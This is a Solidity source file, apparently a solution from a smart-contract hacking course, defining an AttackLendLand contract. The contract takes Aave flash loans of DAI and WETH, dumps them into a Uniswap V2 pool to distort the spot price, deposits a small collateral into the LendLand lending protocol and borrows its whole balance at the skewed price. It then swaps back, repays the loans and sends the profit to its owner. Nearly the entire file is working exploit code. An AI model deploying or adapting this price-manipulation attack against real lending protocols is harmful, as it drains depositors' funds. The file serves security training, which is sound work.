// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity 0.8.13;

import {IUniswapV2Pair} from "../../interfaces/IUniswapV2.sol";
import {IUniswapV2Router01} from "../../interfaces/IUniswapV2.sol";
import "../../interfaces/ILendingPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";

interface ILendLand {
    function deposit(address _token, uint256 _amount) external;
    function borrow(address _token, uint256 _amount) external;
}


contract AttackLendLand is Ownable {

    // Protocols / Contracts
    ILendLand private immutable lendland;
    IUniswapV2Pair private immutable pair;
    IUniswapV2Router01 private immutable router;
    ILendingPool private immutable aavePool;

    // Tokens
    address private immutable aWETH;
    address private immutable aDAI;
    IERC20 private immutable token0; // DAI
    IERC20 private immutable token1; // WETH

    uint256 private reserve0;
    uint256 private reserve1;

    constructor(
        address _pair, address _router, address _lendland,
        address _aavePool, address _aweth, address _adai
    ) {
        // Protocols / Contracts
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router01(_router);
        lendland = ILendLand(_lendland);
        aavePool = ILendingPool(_aavePool);

        // Tokens
        aWETH = _aweth;
        aDAI = _adai;
        token0 = IERC20(IUniswapV2Pair(_pair).token0()); // DAI
        token1 = IERC20(IUniswapV2Pair(_pair).token1()); // WETH
    }

    function attack() external onlyOwner {
        console.log("~~~~~~~~~~~~~ Attack START ~~~~~~~~~~~~~");

        // Detemine AAVE Liquidity
        uint256 daiLiquidity = token0.balanceOf(aDAI);
        uint256 wethLiquidity = token1.balanceOf(aWETH);
        console.log("Available DAI Liquidity in AAVE V2 aDAI Contract: ", daiLiquidity);
        console.log("Available WETH Liquidity in AAVE V2 aWETH Contract: ", wethLiquidity);

        // Initiate DAI FlashLoan
        _getFlashLoan(address(token0), daiLiquidity);
        token0.transfer(owner(), token0.balanceOf(address(this)));

        // Initiate WETH FlashLoan
        _getFlashLoan(address(token1), wethLiquidity / 9);
        token1.transfer(owner(), token1.balanceOf(address(this)));

        console.log("~~~~~~~~~~~~~ Attack END ~~~~~~~~~~~~~");
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {

        require(msg.sender == address(aavePool), "not pool");
        require(initiator == address(this), "I didn't initiate this flash loan");

        IERC20 token;
        uint256 minAmountOut;
        address[] memory path = new address[](2);
        uint256 wethBalance;
        uint256 daiBalance;
        uint256 toDeposit;
        
        _fetchReserves();
        
        for(uint256 i = 0; i < assets.length; i++) {

            token = IERC20(assets[i]);

            // DAI FlashLoan case
            if(token == token0){
                console.log("~~~~~~~~~~~~~ DAI Flashloan START ~~~~~~~~~~~~~");
                console.log("DAI Received from Flash Loan: ", amounts[i]);

                // Sell out flash loaned DAI to WETH
                minAmountOut = router.getAmountOut(amounts[i], reserve0, reserve1);
                path[0] = address(token0);
                path[1] = address(token1);
                token0.approve(address(router), amounts[i]);
                router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);
                wethBalance = token1.balanceOf(address(this)); // We got WETH from the swap 
                console.log("WETH balance after swap: ", wethBalance);
                _fetchReserves();

                // Deposit 0.24% of our WETH
                toDeposit = wethBalance * 24 / 10000;
                console.log("WETH to deposit: ", toDeposit);
                token1.approve(address(lendland), toDeposit);
                lendland.deposit(address(token1), toDeposit);

                // Try to borrow all of the DAI balance
                console.log("Want to borrow DAI: ", token0.balanceOf(address(lendland)));
                lendland.borrow(address(token0), token0.balanceOf(address(lendland)));

                // Swap back from WETH to DAI
                wethBalance = token1.balanceOf(address(this));
                minAmountOut = router.getAmountOut(wethBalance, reserve1, reserve0);
                path[0] = address(token1);
                path[1] = address(token0);
                token1.approve(address(router), wethBalance);
                router.swapExactTokensForTokens(wethBalance, minAmountOut, path, address(this), block.timestamp);

                daiBalance = token0.balanceOf(address(this));
                console.log("Dai Balance: ", daiBalance);
                console.log("~~~~~~~~~~~~~ DAI Flashloan END ~~~~~~~~~~~~~");
            } 
            // WETH FlashLoan case
            else {
                console.log("~~~~~~~~~~~~~ WETH Flashloan START ~~~~~~~~~~~~~");
                console.log("WETH Received from Flash Loan: ", amounts[i]);

                // Sell out flash loaned WETH to DAI
                minAmountOut = router.getAmountOut(amounts[i], reserve1, reserve0);
                path[0] = address(token1);
                path[1] = address(token0);
                token1.approve(address(router), amounts[i]);
                router.swapExactTokensForTokens(amounts[i], minAmountOut, path, address(this), block.timestamp);
                daiBalance = token0.balanceOf(address(this)); // We got DAI from the swap 
                console.log("DAI balance after swap: ", daiBalance);
                _fetchReserves();

                // Deposit 0.27% of our DAI
                toDeposit = daiBalance * 27 / 10000;
                console.log("DAI to deposit: ", toDeposit);
                token0.approve(address(lendland), toDeposit);
                lendland.deposit(address(token0), toDeposit);

                // Try to borrow all of the WETH balance
                console.log("Want to borrow WETH: ", token1.balanceOf(address(lendland)));
                lendland.borrow(address(token1), token1.balanceOf(address(lendland)));

                // Swap back from DAI to WETH
                daiBalance = token0.balanceOf(address(this));
                minAmountOut = router.getAmountOut(daiBalance, reserve0, reserve1);
                path[0] = address(token0);
                path[1] = address(token1);
                token0.approve(address(router), daiBalance);
                router.swapExactTokensForTokens(daiBalance, minAmountOut, path, address(this), block.timestamp);

                wethBalance = token1.balanceOf(address(this));
                console.log("WETH Balance: ", wethBalance);
                console.log("~~~~~~~~~~~~~ WETH Flashloan END ~~~~~~~~~~~~~");
            }

            uint256 owed = amounts[i] + premiums[i]; // 0.09% Flash loan fee (premium)
            token.approve(address(aavePool), owed);
        }

        return true;
    }

    function _getFlashLoan(address token, uint amount) internal {
        address[] memory tokens = new address[](1);
        tokens[0] = token;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aavePool.flashLoan(address(this), tokens, amounts, modes, address(this), "0x", 0);
    }

    function _fetchReserves() internal {
        (reserve0, reserve1, ) = pair.getReserves();
        console.log("reserve0: ", reserve0);
        console.log("reserve1: ", reserve1);
        console.log("ETH price: ", reserve0 / reserve1);
    }
}